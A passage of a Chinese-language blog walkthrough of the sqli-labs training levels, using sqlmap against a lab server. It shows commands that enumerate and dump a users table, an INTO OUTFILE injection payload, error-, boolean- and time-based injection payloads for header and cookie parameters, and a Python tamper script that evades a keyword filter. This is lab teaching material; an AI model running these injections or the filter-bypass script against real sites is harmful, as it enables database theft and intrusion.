+<p>那么直接进行更深一步的信息获取（用到<strong>枚举</strong>功能），比如说尝试注入
+<code>database</code> 函数，即</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-1/?id=1&quot;</span> --current-db</span><br></pre></td></tr></table></figure>
+<p>很轻松获取到回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current database: &#x27;security&#x27;</span><br></pre></td></tr></table></figure>
+<p>更进一步，检索 <code>security</code> 数据库下的表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-1/?id=1&quot;</span> -D security --tables</span><br></pre></td></tr></table></figure>
+<p>回显为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
+<p>更进一步，直接将 <code>users</code> 转储</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-1/?id=1&quot;</span> -D security -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>
+<p>回显为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+<p>至此，我们成功完成一次渗透。</p>
+<h3 id="less-2">Less-2</h3>
+<p>基于错误的注入，GET 整型注入。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-3">Less-3</h3>
+<p>基于错误的注入，但使用了 <code>')</code> 闭合。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-4">Less-4</h3>
+<p>基于错误的注入，GET 双引号字符型注入。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-5">Less-5</h3>
+<p>基于错误的注入，GET 单引号字符型注入，没有回显的盲注。</p>
+<p>相比较之前 sqlmap
+注入的简单化，这次会提示更多的操作来便于获取更多信息。</p>
+<p>但不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-6">Less-6</h3>
+<p>基于错误的注入，GET 双引号字符型注入，没有回显的盲注。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-7">Less-7</h3>
+<p>文件写入的注入。</p>
+<p>如果不加额外参数，在这里 sqlmap
+会通过时间盲注的注入方法，同样可以攻击成功将表转储。</p>
+<p>虽然 sqlmap 有 <code>--file-write</code> 和 <code>--file-read</code>
+的参数，但它内部的实现方法并不是通过 <code>OUTFILE</code>
+指令，而这题的本意是想考 <code>OUTFILE</code>
+指令，故这里给出可能的手解方式。</p>
+<blockquote>
+<p>但 <code>OUTFILE</code>
+不是很现实，许多数据库管理系统默认关闭该指令。</p>
+</blockquote>
+<p>手工测试可以发现在 <code>?id=1')) AND 1=1--+</code>
+时成功注入，那么使用 <code>UNION</code> 结合 <code>OUTFILE</code>
+将内容输出到文件中，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) UNION SELECT 1,2,&#x27;flag&#123;qsdzyyds&#125;&#x27; INTO OUTFILE &quot;/tmp/flag&quot;--+</span><br></pre></td></tr></table></figure>
+<p>使用 sqlmap 的 <code>--file-read</code> 参数可以轻松读取文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-7/?id=1&quot;</span> --file-read <span class="string">&quot;/tmp/flag&quot;</span></span><br></pre></td></tr></table></figure>
+<p>下载后的文件会存放在
+<code>~/.local/share/sqlmap/output/qsdz.vm.szu.moe/files/_tmp_flag</code>。</p>
+<blockquote>
+<p>由于 Linux 权限问题，<code>OUTFILE</code>
+也不一定可以写入任意路径。</p>
+</blockquote>
+<h3 id="less-8">Less-8</h3>
+<p>基于布尔的盲注，GET 单引号字符型。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-9">Less-9</h3>
+<p>基于时间的盲注，GET 单引号字符型。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-10">Less-10</h3>
+<p>基于时间的盲注，GET 双引号字符型。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-11">Less-11</h3>
+<p>基于错误的注入，POST 单引号字符型注入。</p>
+<p>由于是 POST 传参，推荐使用 Burp Suite 抓包后，将一次 POST
+传参的包保存起来，内容可能如下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-11/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>qsdz.vm.szu.moe:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://qsdz.vm.szu.moe:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://qsdz.vm.szu.moe:8888/Less-11/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">uname</span><span class="operator">=</span>admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在 Burp Suite 里右键，选择 Copy to file 即可将请求保存成文件。</p>
+</blockquote>
+<p>尝试初步渗透</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req.txt -b</span><br></pre></td></tr></table></figure>
+<p>成功获得回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: PHP 5.5.9, Apache 2.4.7</span><br><span class="line">back-end DBMS operating system: Linux Ubuntu</span><br><span class="line">back-end DBMS: MySQL 5</span><br><span class="line">banner: &#x27;5.5.47-0ubuntu0.14.04.1&#x27;</span><br></pre></td></tr></table></figure>
+<p>那么忽略中间步骤，看看是否能直接转储表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req.txt -D security -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>
+<p>成功获得回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+<h3 id="less-12">Less-12</h3>
+<p>基于错误的注入，POST 双引号字符型注入。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-13">Less-13</h3>
+<p>基于错误的注入，POST 单引号括号闭合字符型注入。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-14">Less-14</h3>
+<p>基于错误的注入，POST 双引号括号闭合字符型注入。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-15">Less-15</h3>
+<p>基于布尔的时间盲注，POST 单引号字符型注入。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-16">Less-16</h3>
+<p>基于布尔的时间盲注，POST 双引号字符型注入。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-17">Less-17</h3>
+<p>基于错误的注入，<code>UPDATE</code> 注入。</p>
+<p>不出意外无需额外参数便可自动化渗透成功。</p>
+<h3 id="less-18">Less-18</h3>
+<p>基于错误的注入，基于 User-Agent 的注入。</p>
+<blockquote>
+<p>原理是 User-Agent 也被当做输入插入到 SQL 语句中。</p>
+</blockquote>
+<p>此时 sqlmap 需要调整渗透等级，在渗透等级小于 3 时是不会对 User-Agent
+的注入进行测试的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req.txt -f --level 3</span><br></pre></td></tr></table></figure>
+<p>可以在 sqlmap 的回显中发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 4670 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: User-Agent (User-Agent)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36&#x27;||(SELECT 0x6a636279 FROM DUAL WHERE 5395=5395 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71767a7a71,(SELECT (ELT(1337=1337,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||&#x27;</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36&#x27;||(SELECT 0x6a687361 FROM DUAL WHERE 7056=7056 AND (SELECT 7385 FROM (SELECT(SLEEP(5)))UNzj))||&#x27;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+<p>其识别了 User-Agent 参数有注入的可能，而且是基于错误的注入方式。</p>
+<p>在检测出是此参数后，之后无需再携带 <code>--level 3</code> 参数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req.txt -D security -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>
+<p>同样，表被我们转储出来了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | password | username |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| 1  | admin    | Dumb     |</span><br><span class="line">| 2  | admin    | Angelina |</span><br><span class="line">| 3  | admin    | Dummy    |</span><br><span class="line">| 4  | admin    | secure   |</span><br><span class="line">| 5  | admin    | stupid   |</span><br><span class="line">| 6  | admin    | superman |</span><br><span class="line">| 7  | admin    | batman   |</span><br><span class="line">| 8  | admin    | admin    |</span><br><span class="line">| 9  | admin    | admin1   |</span><br><span class="line">| 10 | admin    | admin2   |</span><br><span class="line">| 11 | admin    | admin3   |</span><br><span class="line">| 12 | admin    | dhakkan  |</span><br><span class="line">| 14 | admin    | admin4   |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
+<h3 id="less-19">Less-19</h3>
+<p>基于错误的注入，基于 Referer 的注入。</p>
+<blockquote>
+<p>原理是 Referer 也被当做输入插入到 SQL 语句中。</p>
+</blockquote>
+<p>类似于 Less-18，<code>Referer</code>
+的自动化检测也需要渗透等级大于等于 3。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 5451 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: Referer (Referer)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class="line">    Payload: http://qsdz.vm.szu.moe:8888/Less-19/&#x27; RLIKE (SELECT (CASE WHEN (1666=1666) THEN 0x687474703a2f2f7173647a2e766d2e737a752e6d6f653a383838382f4c6573732d31392f ELSE 0x28 END)) AND &#x27;moYA&#x27;=&#x27;moYA</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: http://qsdz.vm.szu.moe:8888/Less-19/&#x27; OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170627a71,(SELECT (ELT(1530=1530,1))),0x71707a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND &#x27;UbVZ&#x27;=&#x27;UbVZ</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: http://qsdz.vm.szu.moe:8888/Less-19/&#x27; AND (SELECT 2140 FROM (SELECT(SLEEP(5)))fCFV) AND &#x27;joPY&#x27;=&#x27;joPY</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+<p>sqlmap 成功检测出 Referer 可以被注入。</p>
+<h3 id="less-20">Less-20</h3>
+<p>基于错误的注入，基于 Cookie 的注入。</p>
+<blockquote>
+<p>原理是 Cookie 也被当做输入插入到 SQL 语句中。</p>
+</blockquote>
+<p>不同于 Less-18、Less-19，Cookie
+是需要设置才会有的，所以保存的请求中必须存在设置的 Cookie。</p>
+<p>Cookie 需要在渗透等级大于等于 2 时才会自动检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: uname (Cookie)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: uname=admin&#x27; AND 8396=8396 AND &#x27;ikeX&#x27;=&#x27;ikeX</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: uname=admin&#x27; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b766271,(SELECT (ELT(4152=4152,1))),0x7170627a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND &#x27;EdHb&#x27;=&#x27;EdHb</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname=admin&#x27; AND (SELECT 5357 FROM (SELECT(SLEEP(5)))TOTU) AND &#x27;xOBa&#x27;=&#x27;xOBa</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: uname=-6815&#x27; UNION ALL SELECT NULL,CONCAT(0x716b766271,0x4b5858564e56437957576c6d744d6a656952615a6377425a4e674358426150744565785279584f4a,0x7170627a71),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+<h3 id="less-21">Less-21</h3>
+<p>基于 base64 编码单引号的 Cookie 注入。</p>
+<p>如果说传递的参数不是 base64 形式的，会引发后台报错而无法正常执行 SQL
+语句，此时可以使用 tamper 自动化处理 sqlmap 生成的参数。</p>
+<p>其中 <code>base64encode</code> 满足我们的需求。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req.txt -b --level 2 --tamper base64encode</span><br></pre></td></tr></table></figure>
+<h3 id="less-22">Less-22</h3>
+<p>基于 base64 编码双引号的 Cookie 注入。</p>
+<p>与 Less-21 一致。</p>
+<h3 id="less-23">Less-23</h3>
+<p>基于错误的注入，含有对注释符的 WAF。</p>
+<p>不影响 sqlmap 的自动化注入，与 Less-1 类似。</p>
+<h3 id="less-24">Less-24</h3>
+<p>二次注入。</p>
+<p>由于网页逻辑较为复杂，不编写任何脚本使用 sqlmap
+暂时无法完全自动化注入，这里提供手注思路。</p>
+<p>登陆后的页面是修改密码的功能，那么考虑其使用 <code>UPDATE</code>
+进行修改密码，那么其中 <code>WHERE</code>
+匹配的是目前的用户名，如果说先对目前的用户名进行注入，随后在修改密码的界面提交表单完成注入。</p>
+<p>sqlmap 无法进行自动化注入的原因在于，需要先登录获得一个 Cookie
+才可以进入修改密码的界面。</p>
+<p>那么可以写一个 tamper
+脚本，在第一个页面请求的时候，保存注册的用户名和密码（由 sqlmap
+提供的攻击负载），在第二个页面请求之前，先用之前保存的用户名和密码请求获取一个
+Cookie 保存在文件中，通过 <code>--live-cookies</code> 传递 Cookie。</p>
+<blockquote>
+<p>可以参考 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap">https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap</a></p>
+</blockquote>
+<h3 id="less-25">Less-25</h3>
+<p>基于错误的注入，含有对 <code>OR</code> 和 <code>AND</code> 的
+WAF。</p>
+<p>对 sqlmap 的注入有一定影响，因为 <code>or</code>
+常出现在正常的单词中，例如 <code>password</code>，此时需要写一个新的
+tamper，双写 tamper 脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="comment"># KEYWORDS = [&quot;ABORT&quot;, &quot;ACTION&quot;, &quot;ADD&quot;, &quot;AFTER&quot;, &quot;ALL&quot;, &quot;ALTER&quot;, &quot;ALWAYS&quot;, &quot;ANALYZE&quot;, &quot;AND&quot;, &quot;AS&quot;, &quot;IN&quot;, &quot;ASC&quot;, &quot;ATTACH&quot;, &quot;AUTOINCREMENT&quot;, &quot;BEFORE&quot;, &quot;BEGIN&quot;, &quot;BETWEEN&quot;, &quot;CASCADE&quot;, &quot;CASE&quot;, &quot;CAST&quot;, &quot;CHECK&quot;, &quot;COLLATE&quot;, &quot;COLUMN&quot;, &quot;COMMIT&quot;, &quot;CONFLICT&quot;, &quot;CONSTRAINT&quot;, &quot;CREATE&quot;, &quot;CROSS&quot;, &quot;CURRENT&quot;, &quot;CURRENT_DATE&quot;, &quot;CURRENT_TIME&quot;, &quot;CURRENT_TIMESTAMP&quot;, &quot;DATABASE&quot;, &quot;DEFAULT&quot;, &quot;DEFERRABLE&quot;, &quot;DEFERRED&quot;, &quot;DELETE&quot;, &quot;DESC&quot;, &quot;DETACH&quot;, &quot;DISTINCT&quot;, &quot;DO&quot;, &quot;DROP&quot;, &quot;EACH&quot;, &quot;ELSE&quot;, &quot;END&quot;, &quot;ESCAPE&quot;, &quot;EXCEPT&quot;, &quot;EXCLUDE&quot;, &quot;EXCLUSIVE&quot;, &quot;EXISTS&quot;, &quot;EXplaIN&quot;, &quot;FAIL&quot;, &quot;FILTER&quot;, &quot;FIRST&quot;, &quot;FOLLOWING&quot;, &quot;FOR&quot;, &quot;FOREIGN&quot;, &quot;FROM&quot;, &quot;FULL&quot;, &quot;GENERATED&quot;, &quot;GLOB&quot;, &quot;GROUP&quot;, &quot;GROUPS&quot;, &quot;HAVING&quot;, &quot;IF&quot;, &quot;IGNORE&quot;, &quot;IMMEDIATE&quot;, &quot;INDEX&quot;, &quot;INDEXED&quot;, &quot;INITIALLY&quot;, &quot;INNER&quot;,&quot;INSERT&quot;, &quot;INSTEAD&quot;, &quot;INTERSECT&quot;, &quot;INTO&quot;, &quot;IS&quot;, &quot;ISNULL&quot;, &quot;JOIN&quot;, &quot;KEY&quot;, &quot;LAST&quot;, &quot;LEFT&quot;, &quot;LIKE&quot;, &quot;LIMIT&quot;, &quot;MATCH&quot;, &quot;MATERIALIZED&quot;, &quot;NATURAL&quot;, &quot;NO&quot;, &quot;NOT&quot;, &quot;NOTHING&quot;, &quot;NOTNULL&quot;, &quot;NULL&quot;, &quot;NULLS&quot;, &quot;OF&quot;, &quot;OFFSET&quot;, &quot;ON&quot;, &quot;OR&quot;, &quot;ORDER&quot;, &quot;OTHERS&quot;, &quot;OUTER&quot;, &quot;OVER&quot;, &quot;PARTITION&quot;, &quot;plaN&quot;, &quot;PRAGMA&quot;, &quot;PRECEDING&quot;, &quot;PRIMARY&quot;, &quot;QUERY&quot;, &quot;RAISE&quot;, &quot;RANGE&quot;, &quot;RECURSIVE&quot;, &quot;REFERENCES&quot;, &quot;REGEXP&quot;, &quot;REINDEX&quot;, &quot;RELEASE&quot;, &quot;RENAME&quot;, &quot;REplaCE&quot;, &quot;RESTRICT&quot;, &quot;RETURNING&quot;, &quot;RIGHT&quot;, &quot;ROLLBACK&quot;, &quot;ROW&quot;, &quot;ROWS&quot;, &quot;SAVEPOINT&quot;, &quot;SELECT&quot;, &quot;SET&quot;, &quot;TABLE&quot;, &quot;TEMP&quot;, &quot;TEMPORARY&quot;, &quot;THEN&quot;, &quot;TIES&quot;, &quot;TO&quot;, &quot;TRANSACTION&quot;, &quot;TRIGGER&quot;, &quot;UNBOUNDED&quot;, &quot;UNION&quot;, &quot;UNIQUE&quot;, &quot;UPDATE&quot;, &quot;USING&quot;, &quot;VACUUM&quot;, &quot;VALUES&quot;, &quot;VIEW&quot;, &quot;VIRTUAL&quot;, &quot;WHEN&quot;, &quot;WHERE&quot;, &quot;WINDOW&quot;, &quot;WITH&quot;, &quot;WITHOUT&quot;]</span></span><br><span class="line">KEYWORDS = [<span class="string">&quot;AND&quot;</span>, <span class="string">&quot;OR&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Double-Write keywords (e.g. and -&gt; aandnd)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;and or&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;aandnd oorr&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="keyword">for</span> keyword <span class="keyword">in</span> KEYWORDS:</span><br><span class="line">            retVal = re.sub(<span class="string">f&quot;(?i)(<span class="subst">&#123;keyword&#125;</span>)&quot;</span>, keyword[:<span class="number">1</span>] + keyword + keyword[<span class="number">1</span>:], retVal)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>由于无脑双写容易造成执行错误，故这里仅指定关键字 <code>AND</code> 和
+<code>OR</code>。</p>
+<p>将该脚本保存在 <code>./tamper</code> 目录下，执行下行命令即可。</p>
